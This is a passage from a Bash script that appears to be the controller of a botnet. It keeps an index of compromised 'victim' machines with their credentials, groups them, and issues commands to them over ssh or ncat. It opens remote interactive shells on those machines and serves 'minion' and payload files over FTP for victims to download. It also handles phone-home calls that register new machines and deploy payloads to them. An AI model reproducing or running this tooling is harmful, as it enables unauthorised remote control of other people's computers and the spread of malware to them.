        print ""
    }' "$CONSCRIPT_INDEX"
    return $?
}

function search_conscripts_by_identifier () {
    awk -F, \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%20s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group"
        printf " ____________________________________________________________________________________________________________\n"
    }'
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        awk -F, -v conscript_id="$conscript_id" \
        '$1 !~ "#" && $1 == conscript_id { printf " %s%15s%10s%10s%18s%22s%22s\n", $1, $2, $3, $4, $5, $6, $7 }
        END {
            print ""
        }' "$CONSCRIPT_INDEX"

    done
    return $?
}

function search_conscripts_by_address () {
    awk -F, \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%20s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group"
        printf " ____________________________________________________________________________________________________________\n"
    }'
    for conscript_addr in ${VICTIM_ADDRESSES[@]}; do
        awk -F, -v conscript_addr="$conscript_addr" \
        '$1 !~ "#" && $2 == conscript_addr { printf " %s%15s%10s%10s%18s%22s%22s\n", $1, $2, $3, $4, $5, $6, $7 }
        END {
            print ""
        }' "$CONSCRIPT_INDEX"
    done
    return $?
}

function search_conscripts_by_port () {
    awk -F, -v conscript_port="$PORT_NUMBER" \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%20s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group"
        printf " ____________________________________________________________________________________________________________\n"
    }
    $1 !~ "#" && $3 == conscript_port { printf " %s%15s%10s%10s%18s%22s%22s\n", $1, $2, $3, $4, $5, $6, $7 }
    END {
        print ""
    }' "$CONSCRIPT_INDEX"
    return $?
}

function search_conscripts_by_key () {
    awk -F, -v conscript_key="$VICTIM_KEY" \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%20s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group"
        printf " ____________________________________________________________________________________________________________\n"
    }
    $1 !~ "#" && $6 == conscript_key { printf " %s%15s%10s%10s%18s%22s%22s\n", $1, $2, $3, $4, $5, $6, $7 }
    END {
        print ""
    }' "$CONSCRIPT_INDEX"
    return $?
}

function search_conscripts_by_user () {
    awk -F, -v conscript_user="$VICTIM_USER" \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%20s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group"
        printf " ____________________________________________________________________________________________________________\n"
    }
    $1 !~ "#" && $5 == conscript_user { printf " %s%15s%10s%10s%18s%22s\n", $1, $2, $3, $4, $5, $6, $7 }
    END {
        print ""
    }' "$CONSCRIPT_INDEX"
    return $?
}

# ARCHIVERS

function archive_conscripts_by_attribute () {
    case "$SEARCH_CRITERIA" in
        'identifier')
            archive_conscripts_by_identifier
            ;;
        'address')
            archive_conscripts_by_address
            ;;
        'port')
            archive_conscripts_by_port
            ;;
        'key')
            archive_conscripts_by_key
            ;;
        'user')
            archive_conscripts_by_user
            ;;
        *)
            echo "[ ERROR ]: Invalid conscript attribute ($SEARCH_CRITERIA)."
            return 1
            ;;
    esac
    return $?
}

function archive_specific_conscripts () {
    local ARCHIVE_LABEL="$DEPRECATED_ARCHIVE"
    if [ ${#VICTIM_IDENTIFIERS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscripts specified to archive!"
        return 1
    fi
    local CRECORD_SET=()
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        if [ -z "$conscript_id" ]; then
            continue
        fi
        local CRECORD=`awk -F, -v conscript_id="$conscript_id" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $0, NR; exit 0 }' "$CONSCRIPT_INDEX"`
        if [ -z "$CRECORD" ]; then
            echo "[ WARNING ]: Conscript ($conscript_id) not found!"
            continue
        fi
        local CRECORD_SET=( ${CRECORD_SET[@]} "$CRECORD" )
    done
    add_conscripts_to_archive "$ARCHIVE_LABEL" ${CRECORD_SET[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to archive the following conscripts"\
            "($ARCHIVE_LABEL) - (${VICTIM_IDENTIFIERS})"
    else
        echo "[ OK ]: Conscript machines successfully archived"\
            "($ARCHIVE_LABEL) - (${VICTIM_IDENTIFIERS})"
    fi
    return $EXIT_CODE
}

function archive_all_conscripts () {
    TO_CORECT=( `fetch_all_grouped_conscript_records` )
    unlink_conscripts_from_groups ${TO_CORECT[@]}
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Failures detected when unlinking conscripts"\
            "from groups."
        return 1
    fi
    CONSCRIPT_RECORDS=( `fetch_registered_conscript_records` )
    add_conscripts_to_archive "$DEPRECATED_ARCHIVE" ${CONSCRIPT_RECORDS[@]}
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Failures detected when archiving conscripts."
        return 2
    fi
    return 0
}

function archive_conscripts_by_identifier () {
    local CONSCRIPT_RECORDS=()
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        local CRECORD=`awk -F, -v conscript_id="$conscript_id" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $1, $2, $3, $4, $5, $6, $7 }' \
            "$CONSCRIPT_INDEX"`
        local CONSCRIPT_RECORDS=( ${CONSCRIPT_RECORDS[@]} "$CRECORD" )
    done
    add_conscripts_to_archive "$DEPRECATED_ARCHIVE" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "archive ($DEPRECATED_ARCHIVE)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to archive ($DEPRECATED_ARCHIVE)."
    fi
    return $EXIT_CODE
}

function archive_conscripts_by_address () {
    local CONSCRIPT_RECORDS=()
    for conscript_addr in ${VICTIM_ADDRESSES[@]}; do
        local CRECORD=`awk -F, -v conscript_addr="$conscript_addr" \
            'BEGIN { OFS="," } $1 !~ "#" && $2 == conscript_addr { print $1, $2, $3, $4, $5, $6, $7 }' \
            "$CONSCRIPT_INDEX"`
        local CONSCRIPT_RECORDS=( ${CONSCRIPT_RECORDS[@]} "$CRECORD" )
    done
    add_conscripts_to_archive "$DEPRECATED_ARCHIVE" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "archive ($DEPRECATED_ARCHIVE)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to archive ($DEPRECATED_ARCHIVE)."
    fi
    return $EXIT_CODE
}

function archive_conscripts_by_user () {
    local CONSCRIPT_RECORDS=( `awk -F, -v conscript_user="$VICTIM_USER" \
        'BEGIN { OFS="," } $1 !~ "#" && $5 == conscript_user { print $1, $2, $3, $4, $5, $6, $7 }' \
        "$CONSCRIPT_INDEX"` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    add_conscripts_to_archive "$DEPRECATED_ARCHIVE" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "archive ($DEPRECATED_ARCHIVE)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to archive ($DEPRECATED_ARCHIVE)."
    fi
    return $EXIT_CODE
}

function archive_conscripts_by_key () {
    local CONSCRIPT_RECORDS=( `awk -F, -v conscript_key="$VICTIM_KEY" \
        'BEGIN { OFS="," } $1 !~ "#" && $6 == conscript_key { print $1, $2, $3, $4, $5, $6, $7 }' \
        "$CONSCRIPT_INDEX"` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    add_conscripts_to_archive "$DEPRECATED_ARCHIVE" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "archive ($DEPRECATED_ARCHIVE)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to archive ($DEPRECATED_ARCHIVE)."
    fi
    return $EXIT_CODE
}

function archive_conscripts_by_port () {
    local CONSCRIPT_RECORDS=( `awk -F, -v conscript_port="$PORT_NUMBER" \
        'BEGIN { OFS="," } $1 !~ "#" && $3 == conscript_port { print $1, $2, $3, $4, $5, $6, $7 }' \
        "$CONSCRIPT_INDEX"` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    add_conscripts_to_archive "$DEPRECATED_ARCHIVE" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "archive ($DEPRECATED_ARCHIVE)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to archive ($DEPRECATED_ARCHIVE)."
    fi
    return $EXIT_CODE
}

# GROUPERS

function group_conscripts_by_attribute () {
    case "$SEARCH_CRITERIA" in
        'identifier')
            group_conscripts_by_identifier
            ;;
        'address')
            group_conscripts_by_address
            ;;
        'port')
            group_conscripts_by_port
            ;;
        'key')
            group_conscripts_by_key
            ;;
        'user')
            group_conscripts_by_user
            ;;
        *)
            echo "[ ERROR ]: Invalid conscript attribute ($SEARCH_CRITERIA)."
            return 1
            ;;
    esac
    return $?
}

function group_conscripts_by_port () {
    local GROUP_LBL="${GROUP_LABELS[0]}"
    local CONSCRIPT_RECORDS=( `awk -F, -v conscript_port="$PORT_NUMBER" \
        'BEGIN { OFS="," } $1 !~ "#" && $3 == conscript_port { print $1, $2, $3, $4, $5, $6 }' \
        "$CONSCRIPT_INDEX"` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    unlink_conscripts_from_groups "${CONSCRIPT_RECORDS[@]}" &> /dev/null
    add_conscripts_to_group "$GROUP_LBL" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "group ($GROUP_LBL)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to group ($GROUP_LBL)."
    fi
    return $EXIT_CODE
}

function group_conscripts_by_user () {
    local GROUP_LBL="${GROUP_LABELS[0]}"
    local CONSCRIPT_RECORDS=( `awk -F, -v conscript_user="$VICTIM_USER" \
        'BEGIN { OFS="," } $1 !~ "#" && $5 == conscript_user { print $1, $2, $3, $4, $5, $6 }' \
        "$CONSCRIPT_INDEX"` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    unlink_conscripts_from_groups "${CONSCRIPT_RECORDS[@]}" &> /dev/null
    add_conscripts_to_group "$GROUP_LBL" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "group ($GROUP_LBL)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to group ($GROUP_LBL)."
    fi
    return $EXIT_CODE
}

function group_conscripts_by_identifier () {
    local GROUP_LBL="${GROUP_LABELS[0]}"
    local CONSCRIPT_RECORDS=()
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        local CRECORD=`awk -F, -v conscript_id="$conscript_id" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $1, $2, $3, $4, $5, $6 }' \
            "$CONSCRIPT_INDEX"`
        local CONSCRIPT_RECORDS=( ${CONSCRIPT_RECORDS[@]} "${CRECORD},${GROUP_LBL}" )
    done
    unlink_conscripts_from_groups "${CONSCRIPT_RECORDS[@]}" &> /dev/null
    add_conscripts_to_group "$GROUP_LBL" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "group ($GROUP_LBL)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to group ($GROUP_LBL)."
    fi
    return $EXIT_CODE
}

function group_conscripts_by_address () {
    local GROUP_LBL="${GROUP_LABELS[0]}"
    local CONSCRIPT_RECORDS=()
    for conscript_addr in ${VICTIM_ADDRESSES[@]}; do
        local CRECORD=`awk -F, -v conscript_addr="$conscript_addr" \
            'BEGIN { OFS="," } $1 !~ "#" && $2 == conscript_addr { print $1, $2, $3, $4, $5, $6 }' \
            "$CONSCRIPT_INDEX"`
        local CONSCRIPT_RECORDS=( ${CONSCRIPT_RECORDS[@]} "${CRECORD},${GROUP_LBL}" )
    done
    unlink_conscripts_from_groups "${CONSCRIPT_RECORDS[@]}" &> /dev/null
    add_conscripts_to_group "$GROUP_LBL" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "group ($GROUP_LBL)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to group ($GROUP_LBL)."
    fi
    return $EXIT_CODE
}


function group_conscripts_by_key () {
    local GROUP_LBL="${GROUP_LABELS[0]}"
    local CONSCRIPT_RECORDS=( `awk -F, -v conscript_key="$VICTIM_KEY" \
        'BEGIN { OFS="," } $1 !~ "#" && $6 == conscript_key { print $1, $2, $3, $4, $5, $6 }' \
        "$CONSCRIPT_INDEX"` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    unlink_conscripts_from_groups "${CONSCRIPT_RECORDS[@]}"
    add_conscripts_to_group "$GROUP_LBL" ${CONSCRIPT_RECORDS[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add (${#CONSCRIPT_RECORDS[@]}) conscripts to"\
            "group ($GROUP_LBL)."
    else
        echo "[ OK ]: (${#CONSCRIPT_RECORDS[@]}) Conscript machines"\
            "successfully added to group ($GROUP_LBL)."
    fi
    return $EXIT_CODE
}

function group_specific_conscripts () {
    local GROUP_LABEL="${GROUP_LABELS[0]}"
    if [ ${#VICTIM_IDENTIFIERS[@]} -eq 0 ]; then
        local GROUP_RECORD="`awk -v group_label=$GROUP_LABEL \
            '/^group_label/ { print $0 }' $GROUP_INDEX`"
        if [ -z "$GROUP_RECORD" ]; then
            if [ ! -d "${GROUP_DIR}/${GROUP_LABEL}" ]; then
                mkdir "${GROUP_DIR}/${GROUP_LABEL}" &> /dev/null
                if [ $? -ne 0 ]; then
                    echo "[ ERROR ]: Failed to create group directory "\
                        "(${GROUP_DIR}/${GROUP_LABEL}),"
                    return 1
                fi
            fi
            local GROUP_MEMBERS=`ls -1 "${GROUP_DIR}/${GROUP_LABEL}" | wc -l`
            local GROUP_RECORD="${GROUP_LABEL},${GROUP_MEMBERS}"
            echo "$GROUP_RECORD" >> "$GROUP_INDEX"
            return $?
        fi
    fi
    local CRECORD_SET=()
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        if [ -z "$conscript_id" ]; then
            continue
        fi
        local CRECORD=`awk -F, -v conscript_id="$conscript_id" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $0, NR; exit 0 }' \
            "$CONSCRIPT_INDEX"`
        if [ -z "$CRECORD" ]; then
            echo "[ WARNING ]: Conscript ($conscript_id) not found!"
            continue
        fi
        local CRECORD_SET=( ${CRECORD_SET[@]} "$CRECORD" )
    done
    unlink_conscripts_from_groups "${CRECORD_SET[@]}" &> /dev/null
    add_conscripts_to_group "$GROUP_LABEL" ${CRECORD_SET[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to add the following conscripts to group"\
            "($GROUP_LABEL) - (${VICTIM_IDENTIFIERS})"
    else
        echo "[ OK ]: Conscript machines successfully added to group"\
            "($GROUP_LABEL) - (${VICTIM_IDENTIFIERS})"
    fi
    return $EXIT_CODE
}

function group_all_conscripts () {
    TO_CORECT=( `fetch_all_grouped_conscript_records` )
    unlink_conscripts_from_groups ${TO_CORECT[@]}
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Failures detected when unlinking conscripts "\
            "from old groups."
        return 1
    fi
    CONSCRIPT_RECORDS=( `fetch_registered_conscript_records` )
    add_conscripts_to_group "${GROUP_LABELS[0]}" ${CONSCRIPT_RECORDS[@]}
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Failures detected when grouping conscripts."
        return 2
    fi
    return 0
}

# COMMANDERS

function command_conscript () {
    local CRECORD="$1"
    local VCTM_INSTRUCTION="${@:2}"
    case "$PROTOCOL" in
        'ssh')
            command_conscript_ssh "$CRECORD" "$VCTM_INSTRUCTION"
            ;;
        'raw')
            command_conscript_raw "$CRECORD" "$VCTM_INSTRUCTION"
            ;;
    esac
    return $?
}

function command_conscript_raw () {
    local CRECORD="$1"
    local VCTM_INSTRUCTION="${2:-$MISSION_INSTRUCTION}"
    local VCTM_ADDRESS=${VICTIM_ADDRESSES[0]:-`echo "$CRECORD" | awk -F, '{print $2}'`}
    local VCTM_PORT=${PORT_NUMBER:-`echo "$CRECORD" | awk -F, '{print $3}'`}
    local MISSION=`echo "$INSTRUCTION" | ncat -w $CNX_TIMEOUT "$VCTM_ADDRESS" $VCTM_PORT`
    echo "$MISSION"
    return $?
}

function command_conscript_ssh () {
    local CRECORD="$1"
    local VCTM_INSTRUCTION="${2:-$MISSION_INSTRUCTION}"
    local VCTM_ADDRESS=${VICTIM_ADDRESSES[0]:-`echo "$CRECORD" | awk -F, '{print $2}'`}
    local VCTM_PORT=${PORT_NUMBER:-`echo "$CRECORD" | awk -F, '{print $3}'`}
    local VCTM_USER=${VICTIM_USER:-`echo "$CRECORD" | awk -F, '{print $5}'`}
    local VCTM_KEY=${VICTIM_KEY:-`echo "$RECORD" | awk -F, '{print $6}'`}
    if [ -f "${VCTM_KEY}" ]; then
        MISSION=`ssh -p $VCTM_PORT "${VCTM_USER}@${VCTM_ADDRESS}" \
            "$VCTM_INSTRUCTION" 2> /dev/null`
    else
        MISSION=`$SSH_COMMAND_CARGO "$VCTM_USER" "$VCTM_ADDRESS" "$VCTM_PORT" \
            "$VCTM_KEY" "$VCTM_INSTRUCTION" 2> /dev/null`
    fi
    echo "$MISSION"
    return $?
}

function command_all_conscripts () {
    local CONSCRIPT_RECORDS=( `fetch_registered_conscript_records` )
    local MISSION_FAILURE=()
    local MISSION_COMPLETE=()
    for conscript_record in ${CONSCRIPT_RECORDS[@]}; do
        local MISSION=`command_conscript "$conscript_record"`
        if [ $? -ne 0 ]; then
            local MISSION_FAILURE=(
                ${MISSION_FAILURE[@]} "$conscript_record"
            )
        else
            local MISSION_COMPLETE=(
                ${MISSION_COMPLETE[@]} "$conscript_record"
            )
        fi
        echo "-- RECORD -- $conscript_record --
        "
        echo "$MISSION
        "
        echo "-- END -- `date` --
        "
        if [[ "$PAPER_TRAIL_FLAG" == 'on' ]]; then
            generate_interogation_report "$conscript_record" "$MISSION"
        fi
    done
    if [ ${#MISSION_FAILURE[@]} -ne 0 ]; then
        if [ ${#MISSION_COMPLETE[@]} -eq 0 ]; then
            return 1
        fi
    fi
    return 0
}

function command_grouped_conscripts () {
    local GROUP_LBL=${GROUP_LABELS[0]}
    local MEMBERSHIP_RECORDS=( `fetch_group_membership_records "$GROUP_LBL"` )
    local MISSION_FAILURE=()
    local MISSION_COMPLETE=()
    for conscript_record in ${MEMBERSHIP_RECORDS[@]}; do
        local MISSION=`command_conscript "$conscript_record"`
        if [ $? -ne 0 ]; then
            local MISSION_FAILURE=(
                ${MISSION_FAILURE[@]} "$conscript_record"
            )
        else
            local MISSION_COMPLETE=(
                ${MISSION_COMPLETE[@]} "$conscript_record"
            )
        fi
        echo "-- RECORD -- $conscript_record --
        "
        echo "$MISSION
        "
        echo "-- END -- `date` --
        "
        if [[ "$PAPER_TRAIL_FLAG" == 'on' ]]; then
            generate_interogation_report "$conscript_record" "$MISSION"
        fi
    done
    if [ ${#MISSION_FAILURES[@]} -ne 0 ]; then
        if [ ${#MISSION_COMPLETE[@]} -eq 0 ]; then
            return 1
        fi
    fi
    return 0
}

function command_specific_conscripts () {
    local MISSION_FAILURE=()
    local MISSION_COMPLETE=()
    for conscript_addr in ${VICTIM_ADDRESSES[@]}; do
        local VCTM_ID=`awk -F, -v ipv4_addr="$conscript_addr" \
            '$2 == ipv4_addr {print $1}' "${CONSCRIPT_INDEX}"`
        local MOCK_RECORD="${VCTM_ID},${conscript_addr},${PORT_NUMBER},${PROTOCOL},${VICTIM_USER},${VICTIM_KEY},"
        local MISSION=`command_conscript "$MOCK_RECORD"`
        if [ $? -ne 0 ]; then
            local MISSION_FAILURE=(
                ${MISSION_FAILURE[@]} "$conscript_record"
            )
        else
            local MISSION_COMPLETE=(
                ${MISSION_COMPLETE[@]} "$conscript_record"
            )
        fi
        echo "-- RECORD -- $VCTM_ID | $conscript_addr --
        "
        echo "$MISSION
        "
        echo "-- END -- `date` --
        "
        if [[ "$PAPER_TRAIL_FLAG" == 'on' ]]; then
            generate_interogation_report "$conscript_record" "$MISSION"
        fi
    done
    if [ ${#MISSION_FAILURE[@]} -ne 0 ]; then
        if [ ${#MISSION_COMPLETE[@]} -eq 0 ]; then
            return 1
        fi
    fi
    return 0
}

# GENERAL

function generate_conscript_id () {
    while :
    do
        local NEW_CID="c${RANDOM}"
        check_conscript_registered "$NEW_CID" &> /dev/null
        if [ $? -eq 0 ]; then
            break
        fi
    done
    echo "$NEW_CID"
    return 0
}

function trap_conscript_commander () {
    trap "echo 'Konversation Terminated!
    '; sleep 1; return 0" 1 2 3 15 20
    return $?
}

function open_interactive_conscript_shell_ssh () {
    local CRECORD="$@"
    local CONSCRIPT_ADDRESS="${VICTIM_ADDRESSES[0]:-`echo $CRECORD | awk -F, '{print $2}'`}"
    local CONSCRIPT_PORT="${PORT_NUMBER:-`echo $CRECORD | awk -F, '{print $3}'`}"
    local CONSCRIPT_USER="${VICTIM_USER:-`echo $CRECORD | awk -F, '{print $5}'`}"
    local CONSCRIPT_KEY="${VICTIM_KEY:-`echo $CRECORD | awk -F, '{print $6}'`}"
    if [ -f "${CONSCRIPT_KEY}" ]; then
        ssh -p $CONSCRIPT_PORT "${CONSCRIPT_USER}@${CONSCRIPT_ADDRESS}"
    else
        echo "
        "
        $SSH_MACHINE_CARGO "$CONSCRIPT_USER" "$CONSCRIPT_ADDRESS" \
            "$CONSCRIPT_PORT" "$CONSCRIPT_KEY" 2> /dev/null
    fi
    return $?
}

function open_interactive_conscript_shell_raw () {
    local CRECORD="$@"
    local CONSCRIPT_ADDRESS=${VICTIM_ADDRESSES[0]:-`echo "$CRECORD" | awk -F, '{print $2}'`}
    local CONSCRIPT_PORT=${PORT_NUMBER:-`echo "$CRECORD" | awk -F, '{print $3}'`}
    local CONSCRIPT_USER=${VICTIM_USER:-`echo "$CRECORD" | awk -F, '{print $5}'`}
    local CONSCRIPT_KEY=${VICTIM_KEY:-`echo "$CRECORD" | awk -F, '{print $6}'`}
    ncat "$CONSCRIPT_ADDRESS" $CONSCRIPT_PORT
    return $?
}

function open_interactive_conscript_shell () {
    local CRECORD="$@"
    case "$PROTOCOL" in
        'ssh')
            open_interactive_conscript_shell_ssh "$CRECORD"
            ;;
        'raw')
            open_interactive_conscript_shell_raw "$CRECORD"
            ;;
        *)
            echo "[ ERROR ]: Invalid conscript connection protocol! ($PROTOCOL)"
            return 1
            ;;
    esac
    return $?
}

function start_ftp_server () {
    ${SYSTEM_COMMANDS['start-vsftpd-server']}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not start FTP server!"\
            "(${SYSTEM_COMMANDS['start-vsftpd-server']})"
    else
        echo "[ OK ]: FTP server available for conscripts to connect!"
    fi
    return $EXIT_CODE
}

function move_minion_files_to_public_vsftpd_directory () {
    local FAILURE_COUNT=0
    local SUCCESS_COUNT=0
    for fl_path in `find ${MINION_DIR_PATH} -type f`; do
        cp "$fl_path" "$FTP_PUBLIC_DIRECTORY" &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not copy minion ($fl_path) to public download"\
                "directory ($FTP_PUBLIC_DIRECTORY)"
            local FAILUER_COUNT=$((FAILURE_COUNT + 1))
        else
            echo "[ OK ]: Successfully made minion available"\
                "for download! ($fl_path)"
            local SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        fi
    done
    echo "[ DONE ]: Made ($SUCCESS_COUNT) minion files available for download"\
        "by hypnotized conscripts! ($FAILURE_COUNT) failure."
    return $FAILURE_COUNT
}

function move_payload_files_to_public_vsftpd_directory () {
    local FAILURE_COUNT=0
    local SUCCESS_COUNT=0
    for fl_path in `find ${PAYLOAD_DIR_PATH} -type f`; do
        cp "$fl_path" "$FTP_PUBLIC_DIRECTORY" &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not move payload ($fl_path) to public download"\
                "directory ($FTP_PUBLIC_DIRECTORY)"
            local FAILUER_COUNT=$((FAILURE_COUNT + 1))
        else
            echo "[ OK ]: Successfully made payload ($fl_path) available"\
                "for downlod!"
            local SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        fi
    done
    echo "[ DONE ]: Made ($SUCCESS_COUNT) payload files available for download"\
        "by hypnotized conscripts! ($FAILURE_COUNT) failure."
    return $FAILURE_COUNT
}

function make_payload_files_available_for_conscript_download () {
    move_minion_files_to_public_vsftpd_directory
    local EXIT1=$?
    move_payload_files_to_public_vsftpd_directory
    local EXIT2=$?
    local EXIT_CODE=`echo "$EXIT1 + $EXIT2" | bc`
    return $EXIT_CODE
}

function process_minion_phone_home_call () {
    # [ NOTE ]: Receive <instruction> <data>,<data>,<data>...
    local MINION_CALL="$@"
    local INSTRUCTION="`echo $MINION_CALL | cut -d' ' -f 1`"
    if [ -z "$INSTRUCTION" ]; then
        echo "[ WARNING ]: Could not filter minion phone home instruction!"
        return 1
    fi
    local CALL_DATA="`echo $MINION_CALL | cut -d' ' -f 2`"
    case "$INSTRUCTION" in
        'crecord-update')
            process_minion_instruction_crecord_update "$CALL_DATA"
            ;;
        'crecord-register')
            process_minion_instruction_crecord_register "$CALL_DATA"
            ;;
        *)
            echo "[ ERROR ]: Invalid instruction! ($INSTRUCTION)"
            return 2
            ;;
    esac
    return $?
}

function process_minion_instruction_crecord_update () {
    # [ NOTE ]: Receive <cid>,<new-addr>,<new-port>,<new-proto>,<new-user>,<new-key>
    local MINION_CALL_DATA="$@"
    local CID="`echo $MINION_CALL_DATA | awk -F, '{ print $1 }'`"
    local LINE_NO=`awk -F, -v conscript_id="$CID" \
        'BEGIN { OFS="," } $1 == conscript_id { print NR }' "$CONSCRIPT_INDEX"`
    local SED_CMD=`echo "${LINE_NO}s/.*/${MINION_CALL_DATA}" | \
        awk '{ print $0 "/"; exit }'`
    sed -i "$SED_CMD" "$CONSCRIPT_INDEX" &> /dev/null
    return $?
}

function process_minion_instruction_crecord_register () {
    # [ NOTE ]: Receive <addr>,<port>,<proto>,<user>,<key>
    local MINION_CALL_DATA="$@"
    local CID=`generate_conscript_id`
    echo "[ INFO ]: Generated conscript ID - ($CID)"
    local CRECORD="${CID},${MINION_CALL_DATA}"
    echo "[ INFO ]: Conscript record - ($CRECORD)"
    action_deploy_payload_to_victim_machine "$CRECORD"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not deploy conscript payload to victim machine!"\
            "($CID) (`date +%D-%T`) (${CRECORD})"
        return $EXIT_CODE
    else
        echo "[ OK ]: Successfully deployed conscript payload to victim machine!"\
            "($CID) (`date +%D-%T`) (${CRECORD})"
    fi
    register_conscript `echo "$CRECORD" | awk -F, '{print $1, $2, $7, $3, $4, $5, $6}'`
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not register conscript! ($CID)"\
            "(`date +%D-%T`) (${CRECORD})"
    else
        echo "[ OK ]: Successfully registered conscript! ($CID)"\
            "(`date +%D-%T`) (${CRECORD})"
    fi
    return $EXIT_CODE
}

function start_minion_call_listener () {
    # [ NOTE ]: Reveives - "<instruction> <data>,<data>,<data>..."
    if [ ! -f "$MINION_CALL_LISTENER_ANCHOR" ]; then
        echo "[ INFO ]: Minion phone home listener anchor not found. Building..."
        touch "$MINION_CALL_LISTENER_ANCHOR" &> /dev/null
        if [ $? -ne 0 ]; then
